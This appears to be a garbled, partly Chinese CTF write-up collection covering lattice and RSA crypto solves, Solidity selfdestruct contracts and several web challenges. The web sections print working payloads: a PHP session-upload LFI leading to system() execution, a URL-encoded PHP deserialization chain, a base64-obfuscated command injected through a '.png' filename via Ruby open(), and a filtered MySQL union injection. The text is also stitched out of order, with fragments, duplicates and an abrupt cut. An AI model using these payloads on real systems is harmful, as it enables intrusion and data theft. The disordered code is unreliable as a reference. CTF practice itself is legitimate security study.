R = IntegerModRing(q)
M = Matrix(R, A_values)
ingredients = str(list(M.solve_right(res)))
print(ingredients)
io.sendline(ingredients)
q = 227
io.recvuntil(b'Matrix A of size 15 * 143 :\n')
a = []
for _ in range(15):
    a.append(eval(io.recvline().decode().replace('[ ','[').replace('[ ','[').replace('[ 
','[').replace('  ',' ').replace('  ',' ').replace('  ',' ').replace(' ',', ')))
print(a)
io.recvuntil(b'Vector C of size 1 * 143 :\n')
c = eval(io.recvuntil(']').decode().replace('\n', '').replace('[ ','[').replace('  ',' 
').replace('  ',' ').replace('  ',' ').replace(' ',', '))
print(c)
A_values = matrix(a).T
b_values = vector(ZZ, c)
m = 143
n = 15
A = matrix(ZZ, m + n, m)
Blockchain
CallBox
paradigm-ctf babysandbox
原题给了源码 这个没给,逆完了是⼀样的
for i in range(m):
  A[i, i] = q
for x in range(m):
  for y in range(n):
    A[m + y, x] = A_values[x][y]
lattice = IntegerLattice(A, lll_reduce=True)
print("LLL done")
gram = lattice.reduced_basis.gram_schmidt()[0]
target = vector(ZZ, b_values)
res = Babai_closest_vector(lattice.reduced_basis, gram, target)
print("Closest Vector: {}".format(res))
R = IntegerModRing(q)
M = Matrix(R, A_values)
ingredients = str(list(M.solve_right(res)))
print(ingredients)
io.sendline(ingredients)
io.interactive()
pragma solidity 0.7.0;
contract Receiver {
fallback() external {
assembly {
// hardcode the Destroyer's address here before deploying Receiver
switch call(gas(), 0xE29D3BfAB1e1B1824a0F2B5f186E97B7f8f06F7D, 0x00, 0x00, 0x00, 0x00, 
0x00)
case 0 {
return(0x00, 0x00)
}
case 1 {
selfdestruct(0)
}
}
}
}
pragma solidity 0.7.0;
contract Dummy {
msg.data:0xc24fe9500000000000000000000000008B62B35DB8D278f463D89EBb54E5fE9f6A5305c4
Web
EasyCleanup
在phpinfo⾥发现 session.upload_progress.cleanup 为off，随便设置⼀个PHPSESSID，post请求发送
PHP_SESSION_UPLOAD_PROGRESS为123
再访问http://114.115.134.72:32770/?file=/tmp/sess_aabbc&1=system('ls ');
flag在flag_is_here_not_are_but_you_find⽂件中
pklovecloud
fallback() external {
selfdestruct(address(0));
}
}
cinder = new ace();
    }
        function __toString()      
    {          
        if (isset($this->cinder))  
            return $this->cinder->echo_name();      
    } 
}
class ace
{    
    public $filename;     
    public $openstack;
    public $docker;
    function __construct() 
    {      
        $this->filename = "flag.php";
        $this->docker = 'O:8:"stdClass":2:{s:7:"neutron";s:1:"a";s:4:"nova";R:2;}';
    }
    function echo_name()      
    {
        $this->openstack = unserialize($this->docker);
O%3A3%3A%22acp%22%3A3%3A%7Bs%3A9%3A%22%00%2A%00cinder%22%3BO%3A3%3A%22ace%22%3
A3%3A%7Bs%3A8%3A%22filename%22%3Bs%3A8%3A%22flag.php%22%3Bs%3A9%3A%22openstack%22%
3BN%3Bs%3A6%3A%22docker%22%3Bs%3A56%3A%22O%3A8%3A%22stdClass%22%3A2%3A%7Bs%3A7%3
A%22neutron%22%3Bs%3A1%3A%22a%22%3Bs%3A4%3A%22nova%22%3BR%3A2%3B%7D%22%3B%7Ds%
3A7%3A%22neutron%22%3BN%3Bs%3A4%3A%22nova%22%3BN%3B%7D
PNG图⽚转换器
/etc/passwd⇒ .bash_history⇒flag
https://ruby-doc.org/docs/ruby-doc-bundle/Manual/man-1.4/function.html#open
file=|bash -c "$(echo 'bHMgLw==' | base64 -d)" #.png
cat /FLA9_KywXAv78LbopbpBDuWsm
file=|bash -c "$(echo 'Y2F0IC9GTEE5X0t5d1hBdjc4TGJvcGJwQkR1V3Nt' | base64 -d)" #.png
yet_another_mysql_injection
WebFTP
github可以搜到源码
readme有个⽂件http://114.115.185.167:32770/Readme/mytz.php，执⾏phpinfo即可看到flag
个⼈信息保护
        $this->openstack->neutron = $heat;
        if($this->openstack->neutron === $this->openstack->nova) {
            $file = "./{$this->filename}";
            if (file_get_contents($file))         
            {              
                return file_get_contents($file); 
            }  
            else 
            { 
                return "keystone lost~"; 
            }    
        }
    }
}
$cls = new acp();
echo urlencode(serialize($cls))."\n";
echo $cls;
1'union/**/select/**/mid(`11`,65,217)/**/from(select/**/1,2,3,4,5,6,7,8,9,10,11,12,13,1
4,15,16,17/**/union/**/select/**/*/**/from/**/performance_schema.threads/**/where/**/na
me/**/like'%connection%'/**/limit/**/1,1)t#
data_protection
from Crypto.Util.number import *
from Crypto.Cipher import AES
from sage.all import *
from randcrack import RandCrack
from string import printable
from tqdm import trange
import fuckpy3
from hashlib import sha256
c1 = 957816240401743854837881311445045470230187676709635111668
n1 = 1428634580885297528425426676577388183501352157100030354079
p1 = 22186905890293167337018474103
q1 = 64390888389278700958517837593
e = 65537
phi1 = (p1-1)*(q1-1)
d1 = inverse(e, phi1)
m = long_to_bytes(pow(c1,d1,n1))
name = m
c2 = 
130536335758901947014168058443149874558142143560146132471898114934897766527731676264690
799898101979612646114162466761237443774600199870363900211200409519507785242558249872799
183840268584393920019579160937799894469221007884966637948531502734503223395420211823700
129146868588759186292610563932401562701836312649
n2 = 
134949786048887319137407994803780389722367094355650515833817995038306119197600539524985
448574053755793699799863164150565217726975197643634831307454431403854861515253009970594
684699064052739820092115115614153962139870020206132705821506686959283747802946805730902
605814619499301779892151365118901010526138311982
p2 = 
116167889732441692115408790511355316835000133111758577005329738535927271850338460649807
17918194540453710515251945345524986932165003196804187526561468278997
q2 = n2 // p2
diff = q2 - p2
phi2 = (p2-1)*3*3*(3-1)*(11-1)*(1789-1)*
(10931740521710649641129836704228357436391126949743247361384455561383094203666858697822
945232269161198072127321232960803288081264483098926838278972991-1)
d2 = inverse(e, phi2)
m = long_to_bytes(pow(c2,d2,n2))
phone = m[:11]
pad = bytes_to_long(m[11:])
q = 4808339797
key = [[978955513, 2055248981, 3094004449, 411497641, 4183759491, 521276843, 
1709604203, 3162773533, 2140722701, 782306144, 421964668, 356205891, 1039083484, 
1911377875, 1661230549, 312742665, 3628868938, 2049082743], [3833871085, 2929837680, 
2614720930, 4056572317, 3787185237, 93999422, 590001829, 429074138, 3012080235, 
2336571108, 831707987, 3902814802, 2084593018, 316245361, 1799842819, 2908004545, 
120773816, 2687194173], [3213409254, 3303290739, 742998950, 2956806179, 2834298174, 
429260769, 769267967, 1301491642, 2415087532, 1055496090, 690922955, 2984201071, 
3517649313, 3675968202, 3389582912, 2632941479, 186911789, 3547287806], [4149643988, 
3811477370, 1269911228, 3709435333, 1868378108, 4173520248, 1573661708, 2161236830, 
3266570322, 1611227993, 2539778863, 1857682940, 1020154001, 92386553, 3834719618, 
3775070036, 3777877862, 2982256702], [4281981169, 2949541448, 4199819805, 3654041457, 
3300163657, 1674155910, 1316779635, 66744534, 3804297626, 2709354730, 2460136415, 
3983640368, 3801883586, 1068904857, 4178063279, 41067134, 752202632, 3143016757], 
[3078167402, 2059042200, 252404132, 415008428, 3611056424, 1674088343, 2460161645, 
3311986519, 3130694755, 934254488, 898722917, 2865274835, 567507230, 1328871893, 
3903457801, 2499893858, 492084315, 183531922], [3529830884, 4039243386, 233553719, 
4118146471, 1646804655, 2089146092, 2156344320, 2329927228, 508323741, 1931822010, 
579182891, 176447133, 597011120, 3261594914, 2845298788, 3759915972, 3095206232, 
3638216860], [3352986415, 4264046847, 3829043620, 2530153481, 3421260080, 1669551722, 
4240873925, 2101009682, 3660432232, 4224377588, 929767737, 3729104589, 2835310428, 
1727139644, 1279995206, 1355353373, 2144225408, 1359399895], [3105965085, 818804468, 
3230054412, 2646235709, 4053839846, 2878092923, 587905848, 1589383219, 2408577579, 
880800518, 28758157, 1000513178, 2176168589, 187505579, 89151277, 1238795748, 8168714, 
3501032027], [3473729699, 1900372653, 305029321, 2013273628, 1242655400, 4192234107, 
2446737641, 1341412052, 304733944, 4174393908, 2563609353, 3623415321, 49954007, 
3130983058, 425856087, 2331025419, 34423818, 2042901845], [1397571080, 1615456639, 
1840339411, 220496996, 2042007444, 3681679342, 2306603996, 732207066, 663494719, 
4092173669, 3034772067, 3807942919, 111475712, 2065672849, 3552535306, 138510326, 
3757322399, 2394352747], [371953847, 3369229608, 1669129625, 168320777, 2375427503, 
3449778616, 1977984006, 1543379950, 2293317896, 1239812206, 1198364787, 2465753450, 
3739161320, 2502603029, 1528706460, 1488040470, 3387786864, 1864873515], [1356892529, 
1662755536, 1623461302, 1925037502, 1878096790, 3682248450, 2359635297, 1558718627, 
116402105, 3274502275, 2436185635, 771708011, 3484140889, 3264299013, 885210310, 
4225779256, 363129056, 2488388413], [2636035482, 4140705532, 3187647213, 4009585502, 
351132201, 2592096589, 3785703396, 750115519, 3632692007, 3936675924, 3635400895, 
3257019719, 1928767495, 2868979203, 622850989, 3165580000, 4162276629, 4157491019], 
[1272163411, 1251211247, 357523138, 1233981097, 1855287284, 4079018167, 4028466297, 
92214478, 4290550648, 648034817, 1247795256, 3928945157, 1199659871, 397659647, 
3360313830, 561558927, 3446409788, 2727008359], [1470343419, 3861411785, 953425729, 
65811127, 458070615, 1428470215, 3101427357, 1137845714, 1980562597, 4120983895, 
45901583, 2869582150, 427949409, 3025588000, 3231450975, 3313818165, 4015642368, 
3197557747], [2452385340, 111636796, 897282198, 4273652805, 1223518692, 3680320805, 
2771040109, 3617506402, 3904690320, 77507239, 3010900929, 4099608062, 546322994, 
1084929138, 902220733, 4054312795, 1977510945, 735973665], [3729015155, 3027108070, 
1442633554, 1949455360, 2864504565, 3673543865, 446663703, 3515816196, 1468441462, 
897770414, 2831043012, 707874506, 1098228471, 1225077381, 3622448809, 2409995597, 
3847055008, 1887507220], [1839061542, 1963345926, 2600100988, 1703502633, 1824193082, 
3595102755, 2558488861, 2440526309, 3909166109, 1611135411, 2809397519, 1019893656, 
3281060225, 2387778214, 2460059811, 198824620, 1645102665, 865289621], [224442296, 
3009601747, 3066701924, 1774879140, 880620935, 2676353545, 3748945463, 1994930827, 
75275710, 3710375437, 4132497729, 3010711783, 3731895534, 2434590580, 3409701141, 
2209951200, 995511645, 3571299495], [2337737600, 110982073, 2985129643, 1668549189, 
3298468029, 698015588, 2945584297, 1036821195, 4249059927, 3384611421, 3304378629, 
1307957989, 602821252, 184198726, 1182960059, 4200496073, 1562699893, 3320841302], 
[5866561, 2442649482, 479821282, 2687097642, 3347828225, 1876332308, 2704295851, 
2952277070, 1803967244, 2837783916, 658984547, 3605604364, 1931924322, 3285319978, 
556150900, 3795666798, 261321502, 1040433381], [3855222954, 3565522064, 1841853882, 
1066304362, 3552076734, 3075952725, 2193242436, 2052898568, 2341179777, 3089412493, 
165812889, 4196290126, 3568567671, 28097161, 2249543862, 1251207418, 522526590, 
765541973], [1801734077, 2132230169, 667823776, 3900096345, 3119630138, 3620542178, 
2900630754, 30811433, 608818254, 1040662178, 900811411, 3221833258, 43598995, 
1818995893, 2718507668, 3445138445, 3217962572, 1437902734], [1812768224, 392114567, 
2694519859, 1941199322, 2523549731, 2078453798, 851734499, 2376090593, 2069375610, 
4084690114, 246441363, 4154699271, 58451971, 31806021, 4158724930, 2741293247, 
3230803936, 2790505999], [3906342775, 2231570871, 1258998901, 1517292578, 162889239, 
3130741176, 3925266771, 1780222960, 2378568279, 3873144834, 1597459529, 1581197809, 
4101706041, 196019642, 1439141586, 587446072, 2012673288, 1280875335], [4058452685, 
653145648, 553051697, 1406542226, 4053722203, 994470045, 2066358582, 3919235908, 
2315900402, 3236350874, 172880690, 3104147616, 489606166, 3898059157, 200469827, 
665789663, 3116633449, 4137295625], [1460624254, 4286673320, 2664109800, 1995979611, 